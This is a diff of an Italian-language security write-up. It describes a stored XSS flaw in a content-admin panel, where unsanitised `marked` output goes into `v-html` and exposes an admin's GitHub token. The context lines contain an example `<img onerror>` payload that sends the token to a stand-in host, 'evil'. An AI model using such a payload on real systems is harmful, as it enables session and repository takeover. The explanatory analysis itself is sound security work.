@@ -26,11 +26,10 @@ Una SPA di amministrazione contenuti (2026-06-11) aveva esattamente questo. Il p
 di anteprima dell'editor convogliava l'output di `marked` dentro `v-html` senza alcun
 sanitizer in tutto l'albero delle dipendenze, e per di più un renderer di HTML grezzo
 personalizzato per i tag multimediali lasciava passare i blocchi HTML così com'erano.
-Due fatti la trasformano da teorica in critica. Primo: chi scrive e chi legge stanno a
-livelli di privilegio diversi: gli utenti con ruolo editor scrivono i contenuti del
-blog, mentre i caporedattori e gli admin li revisionano nello stesso pannello di
-anteprima. Secondo: la sessione esposta vale parecchio, perché il token GitHub
-dell'admin viveva in localStorage con gli scope `repo` e `admin:org`.
+Chi scrive e chi legge stanno a livelli di privilegio diversi: gli utenti con ruolo
+editor scrivono i contenuti del blog, mentre i caporedattori e gli admin li revisionano
+nello stesso pannello di anteprima. E la sessione esposta vale parecchio, perché il token
+GitHub dell'admin viveva in localStorage con gli scope `repo` e `admin:org`.
 
 Un editor a basso privilegio committa un post che contiene
 `<img src=x onerror="fetch('https://evil/?t='+localStorage.gh_token)">`, chiede la
